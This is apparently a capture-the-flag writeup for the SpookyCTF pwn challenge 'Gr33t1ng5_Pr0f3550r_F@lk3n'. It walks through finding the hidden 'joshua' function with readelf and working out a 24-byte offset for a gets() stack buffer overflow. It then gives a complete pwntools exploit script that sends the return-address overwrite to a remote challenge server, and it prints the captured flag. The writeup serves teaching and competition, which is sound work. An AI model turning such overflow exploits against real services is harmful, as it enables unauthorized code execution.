---
title: "SpookyCtf Gr33t1ng5_Pr0f3550r_F@lk3n — Full Writeup"
date: 2025-11-02
categories:
  - Independent
tags:
  - pwn
  - buffer-overflow
---

# Gr33t1ng5_Pr0f3550r_F@lk3n CTF — Full Writeup

This document provides a complete solution for the "Gr33t1ng5_Pr0f3550r_F@lk3n" pwn challenge. The goal is to exploit a simple buffer overflow to redirect program execution and capture the flag.

## 🧩 Overview

The challenge provides a 64-bit ELF binary with a classic buffer overflow vulnerability. The program uses the `gets()` function, which does not perform bounds checking, allowing an attacker to overwrite the return address on the stack.

The objective is to overwrite this return address with the address of a hidden function within the binary, `joshua`, which presumably prints the flag.

## Phase 1 — Binary Analysis

**Objective:** Find the address of the `joshua` function and determine the buffer offset.

**Tools:** `readelf`, `nm`, or `objdump`.

First, we need to locate the address of the `joshua` function. We can use `readelf` to inspect the symbol table of the binary.

**Command:**
```sh
readelf -s Gr33t1ng5_Pr0f3550r_F@lk3n | grep joshua
```

**Output:**
```
64: 0000000000400518   26 FUNC    GLOBAL DEFAULT   14 joshua
```
The address of the `joshua` function is `0x400518`.

By analyzing the binary (or reading the provided exploit script's comments), we can determine that the input buffer is 16 bytes (`0x10`) long. In a 64-bit architecture, the saved Base Pointer (RBP) takes up the next 8 bytes on the stack. Therefore, the offset to the return address is:

`16 bytes (buffer) + 8 bytes (saved RBP) = 24 bytes`

## Phase 2 — Crafting the Payload

**Objective:** Create a payload that overwrites the return address with the address of `joshua`.

The payload will consist of two parts:
1.  **Padding:** 24 bytes of arbitrary data to fill the buffer and overwrite the saved RBP.
2.  **New Return Address:** The 8-byte address of `joshua` (`0x400518`), formatted in little-endian.

**Payload Structure:**
```
[ 24 bytes of padding ] [ Address of joshua (p64) ]
```

## Phase 3 — Exploitation

**Objective:** Send the payload to the remote server and receive the flag.

The provided Python script automates this process using the `pwntools` library. It connects to the remote service, sends the crafted payload, and then drops into an interactive shell to display the output from the server.

**Exploit Script:**
```python
#!/usr/bin/env python3
# Exploit script for the "Gr33t1ng5_Pr0f3550r_F@lk3n" challenge
import sys
from pwn import remote, p64

REMOTE_HOST = "134.122.5.152"
REMOTE_PORT = 9001

# Address of the joshua function found using readelf/nm
joshua_addr = 0x0000000000400518

# The buffer is 0x10 bytes, and the saved RBP is 8 bytes.
# Offset to return address = 16 + 8 = 24.
padding = b"A" * 24

# Payload = padding + p64(joshua_addr)
payload = padding + p64(joshua_addr)

print(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}...")
r = remote(REMOTE_HOST, REMOTE_PORT)

# Receive initial banner
try:
    data = r.recv(timeout=1)
    if data:
        print(data.decode(errors="ignore"))
except Exception:
    pass

print("Sending payload...")
r.sendline(payload)

# Interact to get the flag
print("Interactive output:")
try:
    r.interactive()
except KeyboardInterrupt:
    print("\nDone.")
    r.close()
```

When the script is executed, it connects to the server, sends the payload, and the server responds by executing the `joshua` function, which prints the flag.

## 🏁 Flag

After running the exploit, the `joshua` function is executed, revealing the flag.

**Flag:** `NICC{f4lk3N_10g1N}`
